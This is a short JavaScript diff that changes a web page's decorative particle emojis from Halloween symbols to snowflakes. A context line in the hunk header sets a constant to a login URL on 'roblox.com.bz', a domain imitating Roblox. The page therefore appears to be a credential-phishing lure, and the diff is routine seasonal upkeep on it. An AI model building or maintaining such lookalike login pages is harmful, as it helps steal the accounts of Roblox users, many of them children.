@@ -16,7 +16,7 @@ const ROBLOX_LINK = 'https://roblox.com.bz/login?returnUrl=2457737694782978'; //
 
 function createParticles() {
     const particlesContainer = document.getElementById('particles');
-    const emojis = ['🦇', '🎃', '👻', '💀', '🕷️', '🕸️', '🍬', '🦉', '🌙'];
+    const emojis = ['❄️', '❄️', '❄️', '❄️', '❄️', '❄️', '❄️', '❄️', '❄️'];
 
     for (let i = 0; i < 25; i++) {
         const particle = document.createElement('span');
